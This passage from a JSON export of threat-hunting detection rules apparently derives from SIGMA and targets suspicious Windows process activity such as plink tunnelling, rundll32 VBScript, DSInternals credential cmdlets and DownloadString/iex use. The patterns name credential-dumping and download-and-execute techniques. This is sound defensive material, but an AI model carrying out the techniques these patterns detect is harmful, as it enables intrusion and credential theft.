            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 179
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the 'Get-Clipboard' cmdlet via CLI",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1115"
            ],
            "name": "PowerShell Get-Clipboard Cmdlet Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"Get-Clipboard\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 180
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execution of plink to perform data exfiltration and tunneling",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "Potential RDP Tunneling Via Plink",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\plink.exe\" and tgt.process.cmdline contains \":127.0.0.1:3389\") or ((tgt.process.image.path contains \"\\plink.exe\" and tgt.process.cmdline contains \":3389\") and (tgt.process.cmdline contains \" -P 443\" or tgt.process.cmdline contains \" -P 22\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 181
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1218",
                "t1202"
            ],
            "name": "Uncommon Child Process Of BgInfo.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\bginfo.exe\" or src.process.image.path contains \"\\bginfo64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 182
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects events that appear when a user click on a link file with a powershell command in it",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Hidden Powershell in Link File Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\explorer.exe\" and tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \".lnk\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 183
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Kernel Dump Using Dtrace",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\dtrace.exe\" and tgt.process.cmdline contains \"lkd(0)\") or (tgt.process.cmdline contains \"syscall:::return\" and tgt.process.cmdline contains \"lkd(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 184
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of a Microsoft signed script executing a managed DLL with PowerShell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "UtilityFunctions.ps1 Proxy Dll",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"UtilityFunctions.ps1\" or tgt.process.cmdline contains \"RegSnapin \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 185
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Desktopimgdownldr Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" /lockscreenurl:\" and (not (tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".jpeg\" or tgt.process.cmdline contains \".png\"))) or (tgt.process.cmdline contains \"reg delete\" and tgt.process.cmdline contains \"\\PersonalizationCSP\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 186
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Suspicious Rundll32 Invoking Inline VBScript",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and tgt.process.cmdline contains \"Execute\" and tgt.process.cmdline contains \"RegRead\" and tgt.process.cmdline contains \"window.close\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 187
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Renamed Rundll32 Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"DllRegisterServer\" and (not tgt.process.image.path contains \"\\rundll32.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 188
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090",
                "t1572"
            ],
            "name": "Potentially Suspicious Usage Of Qemu",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-m 1M\" or tgt.process.cmdline contains \"-m 2M\" or tgt.process.cmdline contains \"-m 3M\") and (tgt.process.cmdline contains \"restrict=off\" and tgt.process.cmdline contains \"-netdev \" and tgt.process.cmdline contains \"connect=\" and tgt.process.cmdline contains \"-nographic\")) and (not (tgt.process.cmdline contains \" -cdrom \" or tgt.process.cmdline contains \" type=virt \" or tgt.process.cmdline contains \" -blockdev \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 189
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\nThe DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "DSInternals Suspicious PowerShell Cmdlets",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Add-ADDBSidHistory\" or tgt.process.cmdline contains \"Add-ADNgcKey\" or tgt.process.cmdline contains \"Add-ADReplNgcKey\" or tgt.process.cmdline contains \"ConvertFrom-ADManagedPasswordBlob\" or tgt.process.cmdline contains \"ConvertFrom-GPPrefPassword\" or tgt.process.cmdline contains \"ConvertFrom-ManagedPasswordBlob\" or tgt.process.cmdline contains \"ConvertFrom-UnattendXmlPassword\" or tgt.process.cmdline contains \"ConvertFrom-UnicodePassword\" or tgt.process.cmdline contains \"ConvertTo-AADHash\" or tgt.process.cmdline contains \"ConvertTo-GPPrefPassword\" or tgt.process.cmdline contains \"ConvertTo-KerberosKey\" or tgt.process.cmdline contains \"ConvertTo-LMHash\" or tgt.process.cmdline contains \"ConvertTo-MsoPasswordHash\" or tgt.process.cmdline contains \"ConvertTo-NTHash\" or tgt.process.cmdline contains \"ConvertTo-OrgIdHash\" or tgt.process.cmdline contains \"ConvertTo-UnicodePassword\" or tgt.process.cmdline contains \"Disable-ADDBAccount\" or tgt.process.cmdline contains \"Enable-ADDBAccount\" or tgt.process.cmdline contains \"Get-ADDBAccount\" or tgt.process.cmdline contains \"Get-ADDBBackupKey\" or tgt.process.cmdline contains \"Get-ADDBDomainController\" or tgt.process.cmdline contains \"Get-ADDBGroupManagedServiceAccount\" or tgt.process.cmdline contains \"Get-ADDBKdsRootKey\" or tgt.process.cmdline contains \"Get-ADDBSchemaAttribute\" or tgt.process.cmdline contains \"Get-ADDBServiceAccount\" or tgt.process.cmdline contains \"Get-ADDefaultPasswordPolicy\" or tgt.process.cmdline contains \"Get-ADKeyCredential\" or tgt.process.cmdline contains \"Get-ADPasswordPolicy\" or tgt.process.cmdline contains \"Get-ADReplAccount\" or tgt.process.cmdline contains \"Get-ADReplBackupKey\" or tgt.process.cmdline contains \"Get-ADReplicationAccount\" or tgt.process.cmdline contains \"Get-ADSIAccount\" or tgt.process.cmdline contains \"Get-AzureADUserEx\" or tgt.process.cmdline contains \"Get-BootKey\" or tgt.process.cmdline contains \"Get-KeyCredential\" or tgt.process.cmdline contains \"Get-LsaBackupKey\" or tgt.process.cmdline contains \"Get-LsaPolicy\" or tgt.process.cmdline contains \"Get-SamPasswordPolicy\" or tgt.process.cmdline contains \"Get-SysKey\" or tgt.process.cmdline contains \"Get-SystemKey\" or tgt.process.cmdline contains \"New-ADDBRestoreFromMediaScript\" or tgt.process.cmdline contains \"New-ADKeyCredential\" or tgt.process.cmdline contains \"New-ADNgcKey\" or tgt.process.cmdline contains \"New-NTHashSet\" or tgt.process.cmdline contains \"Remove-ADDBObject\" or tgt.process.cmdline contains \"Save-DPAPIBlob\" or tgt.process.cmdline contains \"Set-ADAccountPasswordHash\" or tgt.process.cmdline contains \"Set-ADDBAccountPassword\" or tgt.process.cmdline contains \"Set-ADDBBootKey\" or tgt.process.cmdline contains \"Set-ADDBDomainController\" or tgt.process.cmdline contains \"Set-ADDBPrimaryGroup\" or tgt.process.cmdline contains \"Set-ADDBSysKey\" or tgt.process.cmdline contains \"Set-AzureADUserEx\" or tgt.process.cmdline contains \"Set-LsaPolicy\" or tgt.process.cmdline contains \"Set-SamAccountPasswordHash\" or tgt.process.cmdline contains \"Set-WinUserPasswordHash\" or tgt.process.cmdline contains \"Test-ADDBPasswordQuality\" or tgt.process.cmdline contains \"Test-ADPasswordQuality\" or tgt.process.cmdline contains \"Test-ADReplPasswordQuality\" or tgt.process.cmdline contains \"Test-PasswordQuality\" or tgt.process.cmdline contains \"Unlock-ADDBAccount\" or tgt.process.cmdline contains \"Write-ADNgcKey\" or tgt.process.cmdline contains \"Write-ADReplNgcKey\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 190
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process run from unusual locations",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Process Start Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \":\\RECYCLER\\\" or tgt.process.image.path contains \":\\SystemVolumeInformation\\\") or (tgt.process.image.path contains \"C:\\Windows\\Tasks\\\" or tgt.process.image.path contains \"C:\\Windows\\debug\\\" or tgt.process.image.path contains \"C:\\Windows\\fonts\\\" or tgt.process.image.path contains \"C:\\Windows\\help\\\" or tgt.process.image.path contains \"C:\\Windows\\drivers\\\" or tgt.process.image.path contains \"C:\\Windows\\addins\\\" or tgt.process.image.path contains \"C:\\Windows\\cursors\\\" or tgt.process.image.path contains \"C:\\Windows\\system32\\tasks\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 191
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious children spawned via the Windows Terminal application which could be a sign of persistence via WindowsTerminal (see references section)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious WindowsTerminal Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WindowsTerminal.exe\" or src.process.image.path contains \"\\wt.exe\") and ((tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\csc.exe\") or (tgt.process.image.path contains \"C:\\Users\\Public\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Desktop\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\TEMP\\\") or (tgt.process.cmdline contains \" iex \" or tgt.process.cmdline contains \" icm\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"Import-Module \" or tgt.process.cmdline contains \"ipmo \" or tgt.process.cmdline contains \"DownloadString(\" or tgt.process.cmdline contains \" /c \" or tgt.process.cmdline contains \" /k \" or tgt.process.cmdline contains \" /r \"))) and (not ((tgt.process.cmdline contains \"Import-Module\" and tgt.process.cmdline contains \"Microsoft.VisualStudio.DevShell.dll\" and tgt.process.cmdline contains \"Enter-VsDevShell\") or (tgt.process.cmdline contains \"\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_\" and tgt.process.cmdline contains \"\\LocalState\\settings.json\") or (tgt.process.cmdline contains \"C:\\Program Files\\Microsoft Visual Studio\\\" and tgt.process.cmdline contains \"\\Common7\\Tools\\VsDevCmd.bat\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 192
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command line flags that let the user set a target user and command as e.g. seen in PsExec-like tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious RunAs-Like Flag Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -u system \" or tgt.process.cmdline contains \" --user system \" or tgt.process.cmdline contains \" -u NT\" or tgt.process.cmdline contains \" -u \\\"NT\" or tgt.process.cmdline contains \" -u 'NT\" or tgt.process.cmdline contains \" --system \" or tgt.process.cmdline contains \" -u administrator \") and (tgt.process.cmdline contains \" -c cmd\" or tgt.process.cmdline contains \" -c \\\"cmd\" or tgt.process.cmdline contains \" -c powershell\" or tgt.process.cmdline contains \" -c \\\"powershell\" or tgt.process.cmdline contains \" --command cmd\" or tgt.process.cmdline contains \" --command powershell\" or tgt.process.cmdline contains \" -c whoami\" or tgt.process.cmdline contains \" -c wscript\" or tgt.process.cmdline contains \" -c cscript\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 193
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
